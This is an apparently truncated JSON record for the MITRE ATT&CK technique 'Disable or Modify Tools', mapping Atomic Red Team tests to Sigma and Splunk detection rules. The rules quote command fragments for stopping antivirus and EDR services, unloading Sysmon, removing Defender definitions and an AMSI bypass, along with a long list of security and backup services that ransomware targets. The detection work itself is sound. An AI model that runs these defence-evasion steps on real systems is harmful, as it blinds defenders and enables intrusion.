{
    "id": "T1562.001",
    "name": "Disable or Modify Tools",
    "description": "Adversaries may modify and/or disable security tools to avoid possible detection of their malware/tools and activities. This may take the many forms, such as killing security software processes or services, modifying / deleting Registry keys or configuration files so that tools do not operate properly, or other methods to interfere with security tools scanning or reporting information.\nAdversaries may also tamper with artifacts deployed and utilized by security tools. Security tools may make dynamic changes to system components in order to maintain visibility into specific events. For example, security products may load their own modules and/or modify those loaded by processes to facilitate data collection. Similar to [Indicator Blocking](T1562.006), adversaries may unhook or otherwise modify these features added by tools (especially those that exist in userland or are otherwise potentially accessible to adversaries) to avoid detection.(Citation: OutFlank System Calls)(Citation: MDSec System Calls)",
    "platforms": "Windows, macOS, Linux, Containers, IaaS",
    "kill_chain_phases": "Defense Evasion",
    "data_sources": "Process: Process Termination, Windows Registry: Windows Registry Key Modification, Windows Registry: Windows Registry Key Deletion, Command: Command Execution, Service: Service Metadata, Sensor Health: Host Status",
    "detection": "Monitor processes and command-line arguments to see if security tools/services are killed or stop running. Monitor Registry edits for modifications to services and startup programs that correspond to security tools. Monitoring for changes to other known features used by deployed security tools may also expose malicious activity.\nLack of expected log events may be suspicious.",
    "url": "https://attack.mitre.org/techniques/T1562/001",
    "enrichments": {
        "attack_rule_map": [
            {
                "tech_id": "T1562.001",
                "atomic_attack_guid": "828a1278-81cc-4802-96ab-188bf29ca77d",
                "atomic_attack_name": "Stop Crowdstrike Falcon on Linux",
                "platform": "Linux",
                "splunk_rules": [
                    {
                        "rule_name": "Linux Sudo OR Su Execution",
                        "rule_link": "https://research.splunk.com/endpoint/4b00f134-6d6a-11ec-a90c-acde48001122/"
                    }
                ]
            },
            {
                "tech_id": "T1562.001",
                "atomic_attack_guid": "4ce786f8-e601-44b5-bfae-9ebb15a7d1c8",
                "atomic_attack_name": "Disable syslog",
                "platform": "Linux",
                "sigma_rules": [
                    {
                        "rule_name": "Disable Or Stop Services",
                        "rule_link": "https://github.com/SigmaHQ/sigma/blob/master/rules/linux/process_creation/proc_creation_lnx_services_stop_and_disable.yml",
                        "remote_content": "title: Disable Or Stop Services\nid: de25eeb8-3655-4643-ac3a-b662d3f26b6b\nstatus: test\ndescription: Detects the usage of utilities such as 'systemctl', 'service'...etc to stop or disable tools and services\nreferences:\n    - https://www.trendmicro.com/pl_pl/research/20/i/the-evolution-of-malicious-shell-scripts.html\nauthor: Nasreddine Bencherchali (Nextron Systems)\ndate: 2022-09-15\ntags:\n    - attack.defense-evasion\nlogsource:\n    category: process_creation\n    product: linux\ndetection:\n    selection:\n        Image|endswith:\n            - '/service'\n            - '/systemctl'\n            - '/chkconfig'\n        CommandLine|contains:\n            - 'stop'\n            - 'disable'\n    condition: selection\nfalsepositives:\n    - Legitimate administration activities\nlevel: medium\n"
                    }
                ],
                "splunk_rules": [
                    {
                        "rule_name": "Linux Disable Services",
                        "rule_link": "https://research.splunk.com/endpoint/f2e08a38-6689-4df4-ad8c-b51c16262316/"
                    }
                ]
            },
            {
                "tech_id": "T1562.001",
                "atomic_attack_guid": "fc225f36-9279-4c39-b3f9-5141ab74f8d8",
                "atomic_attack_name": "Disable SELinux",
                "platform": "Linux",
                "sigma_rules": [
                    {
                        "rule_name": "Disabling Security Tools",
                        "rule_link": "https://github.com/SigmaHQ/sigma/blob/master/rules/linux/process_creation/proc_creation_lnx_security_tools_disabling.yml",
                        "remote_content": "title: Disabling Security Tools\nid: e3a8a052-111f-4606-9aee-f28ebeb76776\nstatus: test\ndescription: Detects disabling security tools\nreferences:\n    - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1562.004/T1562.004.md\nauthor: Ömer Günal, Alejandro Ortuno, oscd.community\ndate: 2020-06-17\nmodified: 2022-10-09\ntags:\n    - attack.defense-evasion\n    - attack.t1562.004\nlogsource:\n    category: process_creation\n    product: linux\ndetection:\n    selection_iptables_1:\n        Image|endswith: '/service'\n        CommandLine|contains|all:\n            - 'iptables'\n            - 'stop'\n    selection_iptables_2:\n        Image|endswith: '/service'\n        CommandLine|contains|all:\n            - 'ip6tables'\n            - 'stop'\n    selection_iptables_3:\n        Image|endswith: '/chkconfig'\n        CommandLine|contains|all:\n            - 'iptables'\n            - 'stop'\n    selection_iptables_4:\n        Image|endswith: '/chkconfig'\n        CommandLine|contains|all:\n            - 'ip6tables'\n            - 'stop'\n    selection_firewall_1:\n        Image|endswith: '/systemctl'\n        CommandLine|contains|all:\n            - 'firewalld'\n            - 'stop'\n    selection_firewall_2:\n        Image|endswith: '/systemctl'\n        CommandLine|contains|all:\n            - 'firewalld'\n            - 'disable'\n    selection_carbonblack_1:\n        Image|endswith: '/service'\n        CommandLine|contains|all:\n            - 'cbdaemon'\n            - 'stop'\n    selection_carbonblack_2:\n        Image|endswith: '/chkconfig'\n        CommandLine|contains|all:\n            - 'cbdaemon'\n            - 'off'\n    selection_carbonblack_3:\n        Image|endswith: '/systemctl'\n        CommandLine|contains|all:\n            - 'cbdaemon'\n            - 'stop'\n    selection_carbonblack_4:\n        Image|endswith: '/systemctl'\n        CommandLine|contains|all:\n            - 'cbdaemon'\n            - 'disable'\n    selection_selinux:\n        Image|endswith: '/setenforce'\n        CommandLine|contains: '0'\n    selection_crowdstrike_1:\n        Image|endswith: '/systemctl'\n        CommandLine|contains|all:\n            - 'stop'\n            - 'falcon-sensor'\n    selection_crowdstrike_2:\n        Image|endswith: '/systemctl'\n        CommandLine|contains|all:\n            - 'disable'\n            - 'falcon-sensor'\n    condition: 1 of selection*\nfalsepositives:\n    - Legitimate administration activities\nlevel: medium\n"
                    }
                ]
            },
            {
                "tech_id": "T1562.001",
                "atomic_attack_guid": "871438ac-7d6e-432a-b27d-3e7db69faf58",
                "atomic_attack_name": "Disable Windows Defender with DISM",
                "platform": "Windows",
                "sigma_rules": [
                    {
                        "rule_name": "Dism Remove Online Package",
                        "rule_link": "https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_dism_remove.yml",
                        "remote_content": "title: Dism Remove Online Package\nid: 43e32da2-fdd0-4156-90de-50dfd62636f9\nstatus: test\ndescription: Deployment Image Servicing and Management tool. DISM is used to enumerate, install, uninstall, configure, and update features and packages in Windows images\nreferences:\n    - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1562.001/T1562.001.md#atomic-test-26---disable-windows-defender-with-dism\n    - https://www.trendmicro.com/en_us/research/22/h/ransomware-actor-abuses-genshin-impact-anti-cheat-driver-to-kill-antivirus.html\nauthor: frack113\ndate: 2022-01-16\nmodified: 2022-08-26\ntags:\n    - attack.defense-evasion\n    - attack.t1562.001\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_dismhost:\n        Image|endswith: '\\DismHost.exe'\n        ParentCommandLine|contains|all:\n            - '/Online'\n            - '/Disable-Feature'\n            # - '/FeatureName:'\n            # - '/Remove'\n            # /NoRestart\n            # /quiet\n    selection_dism:\n        Image|endswith: '\\Dism.exe'\n        CommandLine|contains|all:\n            - '/Online'\n            - '/Disable-Feature'\n            # - '/FeatureName:'\n            # - '/Remove'\n            # /NoRestart\n            # /quiet\n    condition: 1 of selection_*\nfalsepositives:\n    - Legitimate script\nlevel: medium\n"
                    }
                ],
                "splunk_rules": [
                    {
                        "rule_name": "Windows DISM Remove Defender",
                        "rule_link": "https://research.splunk.com/endpoint/8567da9e-47f0-11ec-99a9-acde48001122/"
                    }
                ]
            },
            {
                "tech_id": "T1562.001",
                "atomic_attack_guid": "24a12b91-05a7-4deb-8d7f-035fa98591bc",
                "atomic_attack_name": "Kill antimalware protected processes using Backstab",
                "platform": "Windows",
                "sigma_rules": [
                    {
                        "rule_name": "Potential Execution of Sysinternals Tools",
                        "rule_link": "https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_sysinternals_eula_accepted.yml",
                        "remote_content": "title: Potential Execution of Sysinternals Tools\nid: 7cccd811-7ae9-4ebe-9afd-cb5c406b824b\nrelated:\n    - id: 25ffa65d-76d8-4da5-a832-3f2b0136e133\n      type: derived\nstatus: test\ndescription: Detects command lines that contain the 'accepteula' flag which could be a sign of execution of one of the Sysinternals tools\nreferences:\n    - https://twitter.com/Moti_B/status/1008587936735035392\nauthor: Markus Neis\ndate: 2017-08-28\nmodified: 2024-03-13\ntags:\n    - attack.resource-development\n    - attack.t1588.002\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        CommandLine|contains|windash: ' -accepteula'\n    condition: selection\nfalsepositives:\n    - Legitimate use of SysInternals tools\n    - Programs that use the same command line flag\nlevel: low\n"
                    }
                ]
            },
            {
                "tech_id": "T1562.001",
                "atomic_attack_guid": "b32b1ccf-f7c1-49bc-9ddd-7d7466a7b297",
                "atomic_attack_name": "Uninstall Crowdstrike Falcon on Windows",
                "platform": "Windows",
                "sigma_rules": [
                    {
                        "rule_name": "Uninstall Crowdstrike Falcon Sensor",
                        "rule_link": "https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_uninstall_crowdstrike_falcon.yml",
                        "remote_content": "title: Uninstall Crowdstrike Falcon Sensor\nid: f0f7be61-9cf5-43be-9836-99d6ef448a18\nstatus: test\ndescription: Adversaries may disable security tools to avoid possible detection of their tools and activities by uninstalling Crowdstrike Falcon\nreferences:\n    - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1562.001/T1562.001.md\nauthor: frack113\ndate: 2021-07-12\nmodified: 2023-03-09\ntags:\n    - attack.defense-evasion\n    - attack.t1562.001\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        CommandLine|contains|all:\n            - '\\WindowsSensor.exe'\n            - ' /uninstall'\n            - ' /quiet'\n    condition: selection\nfalsepositives:\n    - Administrator might leverage the same command line for debugging or other purposes. However this action must be always investigated\nlevel: high\n"
                    }
                ]
            },
            {
                "tech_id": "T1562.001",
                "atomic_attack_guid": "3d47daaa-2f56-43e0-94cc-caf5d8d52a68",
                "atomic_attack_name": "Remove Windows Defender Definition Files",
                "platform": "Windows",
                "sigma_rules": [
                    {
                        "rule_name": "Windows Defender Definition Files Removed",
                        "rule_link": "https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_mpcmdrun_remove_windows_defender_definition.yml",
                        "remote_content": "title: Windows Defender Definition Files Removed\nid: 9719a8aa-401c-41af-8108-ced7ec9cd75c\nstatus: test\ndescription: Adversaries may disable security tools to avoid possible detection of their tools and activities by removing Windows Defender Definition Files\nreferences:\n    - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1562.001/T1562.001.md\n    - https://unit42.paloaltonetworks.com/unit42-gorgon-group-slithering-nation-state-cybercrime/\nauthor: frack113\ndate: 2021-07-07\nmodified: 2023-07-18\ntags:\n    - attack.defense-evasion\n    - attack.t1562.001\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\MpCmdRun.exe'\n        - OriginalFileName: MpCmdRun.exe\n    selection_cli:\n        CommandLine|contains|all:\n            - ' -RemoveDefinitions'\n            - ' -All'\n    condition: all of selection_*\nfields:\n    - ComputerName\n    - User\n    - CommandLine\n    - ParentCommandLine\nfalsepositives:\n    - Unknown\nlevel: high\n"
                    }
                ]
            },
            {
                "tech_id": "T1562.001",
                "atomic_attack_guid": "aa875ed4-8935-47e2-b2c5-6ec00ab220d2",
                "atomic_attack_name": "Tamper with Windows Defender Command Prompt",
                "platform": "Windows",
                "sigma_rules": [
                    {
                        "rule_name": "Service StartupType Change Via Sc.EXE",
                        "rule_link": "https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_sc_disable_service.yml",
                        "remote_content": "title: Service StartupType Change Via Sc.EXE\nid: 85c312b7-f44d-4a51-a024-d671c40b49fc\nstatus: test\ndescription: Detect the use of \"sc.exe\" to change the startup type of a service to \"disabled\" or \"demand\"\nreferences:\n    - https://www.virustotal.com/gui/file/38283b775552da8981452941ea74191aa0d203edd3f61fb2dee7b0aea3514955\nauthor: Nasreddine Bencherchali (Nextron Systems)\ndate: 2022-08-01\nmodified: 2023-03-04\ntags:\n    - attack.execution\n    - attack.defense-evasion\n    - attack.t1562.001\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\sc.exe'\n        - OriginalFileName: 'sc.exe'\n    selection_cli:\n        CommandLine|contains|all:\n            - ' config '\n            - 'start'\n        CommandLine|contains:\n            - 'disabled'\n            - 'demand'\n    condition: all of selection_*\nfalsepositives:\n    - False positives may occur with troubleshooting scripts\nlevel: medium\n"
                    },
                    {
                        "rule_name": "Disable Windows Defender AV Security Monitoring",
                        "rule_link": "https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_powershell_disable_defender_av_security_monitoring.yml",
                        "remote_content": "title: Disable Windows Defender AV Security Monitoring\nid: a7ee1722-c3c5-aeff-3212-c777e4733217\nstatus: test\ndescription: Detects attackers attempting to disable Windows Defender using Powershell\nreferences:\n    - https://research.nccgroup.com/2020/06/23/wastedlocker-a-new-ransomware-variant-developed-by-the-evil-corp-group/\n    - https://rvsec0n.wordpress.com/2020/01/24/malwares-that-bypass-windows-defender/\n    - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1562.001/T1562.001.md\nauthor: 'ok @securonix invrep-de, oscd.community, frack113'\ndate: 2020-10-12\nmodified: 2022-11-18\ntags:\n    - attack.defense-evasion\n    - attack.t1562.001\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_pwsh_binary:\n        - Image|endswith:\n              - '\\powershell.exe'\n              - '\\pwsh.exe'\n        - OriginalFileName:\n              - 'PowerShell.EXE'\n              - 'pwsh.dll'\n    selection_pwsh_cli:\n        CommandLine|contains:\n            - '-DisableBehaviorMonitoring $true'\n            - '-DisableRuntimeMonitoring $true'\n    selection_sc_binary:\n        - Image|endswith: '\\sc.exe'\n        - OriginalFileName: 'sc.exe'\n    selection_sc_tamper_cmd_stop:\n        CommandLine|contains|all:\n            - 'stop'\n            - 'WinDefend'\n    selection_sc_tamper_cmd_delete:\n        CommandLine|contains|all:\n            - 'delete'\n            - 'WinDefend'\n    selection_sc_tamper_cmd_disabled:\n        CommandLine|contains|all:\n            - 'config'\n            - 'WinDefend'\n            - 'start=disabled'\n    condition: all of selection_pwsh_* or (selection_sc_binary and 1 of selection_sc_tamper_*)\nfalsepositives:\n    - 'Minimal, for some older versions of dev tools, such as pycharm, developers were known to sometimes disable Windows Defender to improve performance, but this generally is not considered a good security practice.'\nlevel: high\n"
                    },
                    {
                        "rule_name": "Suspicious Windows Service Tampering",
                        "rule_link": "https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_susp_service_tamper.yml",
                        "remote_content": "title: Suspicious Windows Service Tampering\nid: ce72ef99-22f1-43d4-8695-419dcb5d9330\nrelated:\n    - id: eb87818d-db5d-49cc-a987-d5da331fbd90\n      type: derived\n    - id: 6783aa9e-0dc3-49d4-a94a-8b39c5fd700b\n      type: obsolete\n    - id: 7fd4bb39-12d0-45ab-bb36-cebabc73dc7b\n      type: obsolete\nstatus: test\ndescription: |\n    Detects the usage of binaries such as 'net', 'sc' or 'powershell' in order to stop, pause, disable or delete critical or important Windows services such as AV, Backup, etc. As seen being used in some ransomware scripts\nreferences:\n    - https://www.trendmicro.com/content/dam/trendmicro/global/en/research/22/h/ransomware-actor-abuses-genshin-impact-anti-cheat-driver-to-kill-antivirus/Genshin%20Impact%20Figure%2010.jpg\n    - https://www.trellix.com/en-sg/about/newsroom/stories/threat-labs/lockergoga-ransomware-family-used-in-targeted-attacks.html\n    - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1562.001/T1562.001.md\n    - https://research.nccgroup.com/2022/08/19/back-in-black-unlocking-a-lockbit-3-0-ransomware-attack/\n    - https://www.virustotal.com/gui/file/38283b775552da8981452941ea74191aa0d203edd3f61fb2dee7b0aea3514955\nauthor: Nasreddine Bencherchali (Nextron Systems), frack113 , X__Junior\ndate: 2022-09-01\nmodified: 2024-12-23\ntags:\n    - attack.defense-evasion\n    - attack.t1489\n    - attack.t1562.001\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_tools_img:\n        - OriginalFileName:\n              - 'net.exe'\n              - 'net1.exe'\n              - 'PowerShell.EXE'\n              - 'psservice.exe'\n              - 'pwsh.dll'\n              - 'sc.exe'\n        - Image|endswith:\n              - '\\net.exe'\n              - '\\net1.exe'\n              - '\\powershell.exe'\n              - '\\PsService.exe'\n              - '\\PsService64.exe'\n              - '\\pwsh.exe'\n              - '\\sc.exe'\n    selection_tools_cli:\n        - CommandLine|contains:\n              - ' delete '\n              - ' pause ' # Covers flags from: PsService and Sc.EXE\n              - ' stop ' # Covers flags from: PsService.EXE, Net.EXE and Sc.EXE\n              - 'Stop-Service '\n              - 'Remove-Service '\n        - CommandLine|contains|all:\n              - 'config'\n              - 'start=disabled'\n    selection_services:\n        CommandLine|contains:\n            - '143Svc'\n            - 'Acronis VSS Provider'\n            - 'AcronisAgent'\n            - 'AcrSch2Svc'\n            - 'AdobeARMservice'\n            - 'AHS Service'\n            - 'Antivirus'\n            - 'Apache4'\n            - 'ARSM'\n            - 'aswBcc'\n            - 'AteraAgent'\n            - 'Avast Business Console Client Antivirus Service'\n            - 'avast! Antivirus'\n            - 'AVG Antivirus'\n            - 'avgAdminClient'\n            - 'AvgAdminServer'\n            - 'AVP1'\n            - 'BackupExec'\n            - 'bedbg'\n            - 'BITS'\n            - 'BrokerInfrastructure'\n            - 'CASLicenceServer'\n            - 'CASWebServer'\n            - 'Client Agent 7.60'\n            - 'Core Browsing Protection'\n            - 'Core Mail Protection'\n            - 'Core Scanning Server'\n            - 'DCAgent'\n            - 'dwmrcs'\n            - 'EhttpSr'\n            - 'ekrn'\n            - 'Enterprise Client Service'\n            - 'epag'\n            - 'EPIntegrationService'\n            - 'EPProtectedService'\n            - 'EPRedline'\n            - 'EPSecurityService'\n            - 'EPUpdateService'\n            - 'EraserSvc11710'\n            - 'EsgShKernel'\n            - 'ESHASRV'\n            - 'FA_Scheduler'\n            - 'FirebirdGuardianDefaultInstance'\n            - 'FirebirdServerDefaultInstance'\n            - 'FontCache3.0.0.0'\n            - 'HealthTLService'\n            - 'hmpalertsvc'\n            - 'HMS'\n            - 'HostControllerService'\n            - 'hvdsvc'\n            - 'IAStorDataMgrSvc'\n            - 'IBMHPS'\n            - 'ibmspsvc'\n            - 'IISAdmin'\n            - 'IMANSVC'\n            - 'IMAP4Svc'\n            - 'instance2'\n            - 'KAVFS'\n            - 'KAVFSGT'\n            - 'kavfsslp'\n            - 'KeyIso'\n            - 'klbackupdisk'\n            - 'klbackupflt'\n            - 'klflt'\n            - 'klhk'\n            - 'KLIF'\n            - 'klim6'\n            - 'klkbdflt'\n            - 'klmouflt'\n            - 'klnagent'\n            - 'klpd'\n            - 'kltap'\n            - 'KSDE1.0.0'\n            - 'LogProcessorService'\n            - 'M8EndpointAgent'\n            - 'macmnsvc'\n            - 'masvc'\n            - 'MBAMService'\n            - 'MBCloudEA'\n            - 'MBEndpointAgent'\n            - 'McAfeeDLPAgentService'\n            - 'McAfeeEngineService'\n            - 'MCAFEEEVENTPARSERSRV'\n            - 'McAfeeFramework'\n            - 'MCAFEETOMCATSRV530'\n            - 'McShield'\n            - 'McTaskManager'\n            - 'mfefire'\n            - 'mfemms'\n            - 'mfevto'\n            - 'mfevtp'\n            - 'mfewc'\n            - 'MMS'\n            - 'mozyprobackup'\n            - 'mpssvc'\n            - 'MSComplianceAudit'\n            - 'MSDTC'\n            - 'MsDtsServer'\n            - 'MSExchange'\n            - 'msftesq1SPROO'\n            - 'msftesql$PROD'\n            - 'msftesql$SQLEXPRESS'\n            - 'MSOLAP$SQL_2008'\n            - 'MSOLAP$SYSTEM_BGC'\n            - 'MSOLAP$TPS'\n            - 'MSOLAP$TPSAMA'\n            - 'MSOLAPSTPS'\n            - 'MSOLAPSTPSAMA'\n            - 'mssecflt'\n            - 'MSSQ!I.SPROFXENGAGEMEHT'\n            - 'MSSQ0SHAREPOINT'\n            - 'MSSQ0SOPHOS'\n            - 'MSSQL'\n            - 'MSSQLFDLauncher$'\n            - 'MySQL'\n            - 'NanoServiceMain'\n            - 'NetMsmqActivator'\n            - 'NetPipeActivator'\n            - 'netprofm'\n            - 'NetTcpActivator'\n            - 'NetTcpPortSharing'\n            - 'ntrtscan'\n            - 'nvspwmi'\n            - 'ofcservice'\n            - 'Online Protection System'\n            - 'OracleClientCache80'\n            - 'OracleDBConsole'\n            - 'OracleMTSRecoveryService'\n            - 'OracleOraDb11g_home1'\n            - 'OracleService'\n            - 'OracleVssWriter'\n            - 'osppsvc'\n            - 'PandaAetherAgent'\n            - 'PccNTUpd'\n            - 'PDVFSService'\n            - 'POP3Svc'\n            - 'postgresql-x64-9.4'\n            - 'POVFSService'\n            - 'PSUAService'\n            - 'Quick Update Service'\n            - 'RepairService'\n            - 'ReportServer'\n            - 'ReportServer$'\n            - 'RESvc'\n            - 'RpcEptMapper'\n            - 'sacsvr'\n            - 'SamSs'\n            - 'SAVAdminService'\n            - 'SAVService'\n            - 'ScSecSvc'\n            - 'SDRSVC'\n            - 'SearchExchangeTracing'\n            - 'sense'\n            - 'SentinelAgent'\n            - 'SentinelHelperService'\n            - 'SepMasterService'\n            - 'ShMonitor'\n            - 'Smcinst'\n            - 'SmcService'\n            - 'SMTPSvc'\n            - 'SNAC'\n            - 'SntpService'\n            - 'Sophos'\n            - 'SQ1SafeOLRService'\n            - 'SQL Backups'\n            - 'SQL Server'\n            - 'SQLAgent'\n            - 'SQLANYs_Sage_FAS_Fixed_Assets'\n            - 'SQLBrowser'\n            - 'SQLsafe'\n            - 'SQLSERVERAGENT'\n            - 'SQLTELEMETRY'\n            - 'SQLWriter'\n            - 'SSISTELEMETRY130'\n            - 'SstpSvc'\n            - 'storflt'\n            - 'svcGenericHost'\n            - 'swc_service'\n            - 'swi_filter'\n            - 'swi_service'\n            - 'swi_update'\n            - 'Symantec'\n            - 'sysmon'\n            - 'TeamViewer'\n            - 'Telemetryserver'\n            - 'ThreatLockerService'\n            - 'TMBMServer'\n            - 'TmCCSF'\n            - 'TmFilter'\n            - 'TMiCRCScanService'\n            - 'tmlisten'\n            - 'TMLWCSService'\n            - 'TmPfw'\n            - 'TmPreFilter'\n            - 'TmProxy'\n            - 'TMSmartRelayService'\n            - 'tmusa'\n            - 'Tomcat'\n            - 'Trend Micro Deep Security Manager'\n            - 'TrueKey'\n            - 'UFNet'\n            - 'UI0Detect'\n            - 'UniFi'\n            - 'UTODetect'\n            - 'vds'\n            - 'Veeam'\n            - 'VeeamDeploySvc'\n            - 'Veritas System Recovery'\n            - 'vmic'\n            - 'VMTools'\n            - 'vmvss'\n            - 'VSApiNt'\n            - 'VSS'\n            - 'W3Svc'\n            - 'wbengine'\n            - 'WdNisSvc'\n            - 'WeanClOudSve'\n            - 'Weems JY'\n            - 'WinDefend'\n            - 'wmms'\n            - 'wozyprobackup'\n            - 'WPFFontCache_v0400'\n            - 'WRSVC'\n            - 'wsbexchange'\n            - 'WSearch'\n            - 'wscsvc'\n            - 'Zoolz 2 Service'\n    condition: all of selection_*\nfalsepositives:\n    - Administrators or tools shutting down the services due to upgrade or removal purposes. If you experience some false positive, please consider adding filters to the parent process launching this command and not removing the entry\nlevel: high\n"
                    }
                ]
            },
            {
                "tech_id": "T1562.001",
                "atomic_attack_guid": "a1230893-56ac-4c81-b644-2108e982f8f5",
                "atomic_attack_name": "Disable Arbitrary Security Windows Service",
                "platform": "Windows",
                "sigma_rules": [
                    {
                        "rule_name": "Service StartupType Change Via Sc.EXE",
                        "rule_link": "https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_sc_disable_service.yml",
                        "remote_content": "title: Service StartupType Change Via Sc.EXE\nid: 85c312b7-f44d-4a51-a024-d671c40b49fc\nstatus: test\ndescription: Detect the use of \"sc.exe\" to change the startup type of a service to \"disabled\" or \"demand\"\nreferences:\n    - https://www.virustotal.com/gui/file/38283b775552da8981452941ea74191aa0d203edd3f61fb2dee7b0aea3514955\nauthor: Nasreddine Bencherchali (Nextron Systems)\ndate: 2022-08-01\nmodified: 2023-03-04\ntags:\n    - attack.execution\n    - attack.defense-evasion\n    - attack.t1562.001\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\sc.exe'\n        - OriginalFileName: 'sc.exe'\n    selection_cli:\n        CommandLine|contains|all:\n            - ' config '\n            - 'start'\n        CommandLine|contains:\n            - 'disabled'\n            - 'demand'\n    condition: all of selection_*\nfalsepositives:\n    - False positives may occur with troubleshooting scripts\nlevel: medium\n"
                    }
                ]
            },
            {
                "tech_id": "T1562.001",
                "atomic_attack_guid": "695eed40-e949-40e5-b306-b4031e4154bd",
                "atomic_attack_name": "AMSI Bypass - AMSI InitFailed",
                "platform": "Windows",
                "sigma_rules": [
                    {
                        "rule_name": "Potential AMSI Bypass Via .NET Reflection",
                        "rule_link": "https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_powershell_amsi_init_failed_bypass.yml",
                        "remote_content": "title: Potential AMSI Bypass Via .NET Reflection\nid: 30edb182-aa75-42c0-b0a9-e998bb29067c\nrelated:\n    - id: 4f927692-68b5-4267-871b-073c45f4f6fe\n      type: obsolete\nstatus: test\ndescription: Detects Request to \"amsiInitFailed\" that can be used to disable AMSI Scanning\nreferences:\n    - https://s3cur3th1ssh1t.github.io/Bypass_AMSI_by_manual_modification/\n    - https://www.mdsec.co.uk/2018/06/exploring-powershell-amsi-and-logging-evasion/\nauthor: Markus Neis, @Kostastsale\ndate: 2018-08-17\nmodified: 2023-02-03\ntags:\n    - attack.defense-evasion\n    - attack.t1562.001\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        - CommandLine|contains|all:\n              - 'System.Management.Automation.AmsiUtils'\n              - 'amsiInitFailed'\n        - CommandLine|contains|all:\n              - '[Ref].Assembly.GetType'\n              - 'SetValue($null,$true)'\n              - 'NonPublic,Static'\n    condition: selection\nfalsepositives:\n    - Unlikely\nlevel: high\n"
                    }
                ]
            },
            {
                "tech_id": "T1562.001",
                "atomic_attack_guid": "811b3e76-c41b-430c-ac0d-e2380bfaa164",
                "atomic_attack_name": "Unload Sysmon Filter Driver",
                "platform": "Windows",
                "sigma_rules": [
                    {
                        "rule_name": "Sysmon Driver Unloaded Via Fltmc.EXE",
                        "rule_link": "https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_fltmc_unload_driver_sysmon.yml",
                        "remote_content": "title: Sysmon Driver Unloaded Via Fltmc.EXE\nid: 4d7cda18-1b12-4e52-b45c-d28653210df8\nrelated:\n    - id: 4931188c-178e-4ee7-a348-39e8a7a56821 # Generic\n      type: similar\nstatus: test\ndescription: Detects possible Sysmon filter driver unloaded via fltmc.exe\nreferences:\n    - https://www.darkoperator.com/blog/2018/10/5/operating-offensively-against-sysmon\nauthor: Kirill Kiryanov, oscd.community\ndate: 2019-10-23\nmodified: 2023-02-13\ntags:\n    - attack.defense-evasion\n    - attack.t1070\n    - attack.t1562\n    - attack.t1562.002\nlogsource:\n    product: windows\n    category: process_creation\ndetection:\n    selection_img:\n        - Image|endswith: '\\fltMC.exe'\n        - OriginalFileName: 'fltMC.exe'\n    selection_cli:\n        CommandLine|contains|all:\n            - 'unload'\n            - 'sysmon'\n    condition: all of selection_*\nfalsepositives:\n    - Unlikely\nlevel: high\n"
                    },
                    {
                        "rule_name": "Filter Driver Unloaded Via Fltmc.EXE",
                        "rule_link": "https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_fltmc_unload_driver.yml",
                        "remote_content": "title: Filter Driver Unloaded Via Fltmc.EXE\nid: 4931188c-178e-4ee7-a348-39e8a7a56821\nrelated:\n    - id: 4d7cda18-1b12-4e52-b45c-d28653210df8 # Sysmon specific\n      type: derived\nstatus: test\ndescription: Detect filter driver unloading activity via fltmc.exe\nreferences:\n    - https://www.darkoperator.com/blog/2018/10/5/operating-offensively-against-sysmon\n    - https://www.cybereason.com/blog/threat-analysis-report-lockbit-2.0-all-paths-lead-to-ransom\nauthor: Nasreddine Bencherchali (Nextron Systems)\ndate: 2023-02-13\nmodified: 2024-06-24\ntags:\n    - attack.defense-evasion\n    - attack.t1070\n    - attack.t1562\n    - attack.t1562.002\nlogsource:\n    product: windows\n    category: process_creation\ndetection:\n    selection_img:\n        - Image|endswith: '\\fltMC.exe'\n        - OriginalFileName: 'fltMC.exe'\n    selection_cli:\n        CommandLine|contains: 'unload'\n    filter_optional_avira:\n        ParentImage|startswith: 'C:\\Users\\'\n        ParentImage|contains: '\\AppData\\Local\\Temp\\'\n        ParentImage|endswith: '\\endpoint-protection-installer-x64.tmp'\n        CommandLine|endswith: 'unload rtp_filesystem_filter'\n    filter_optional_manageengine:\n        ParentImage: 'C:\\Program Files (x86)\\ManageEngine\\uems_agent\\bin\\dcfaservice64.exe'\n        CommandLine|endswith: 'unload DFMFilter'\n    condition: all of selection_* and not 1 of filter_optional_*\nfalsepositives:\n    - Unknown\nlevel: medium\n"
                    }
                ]
            }
        ],
        "cycat": {
            "cycat": {
                "cycat_related_uuids": [
                    "a31eeaed-3fd5-478e-a8ba-e62c6b3f9ecc",
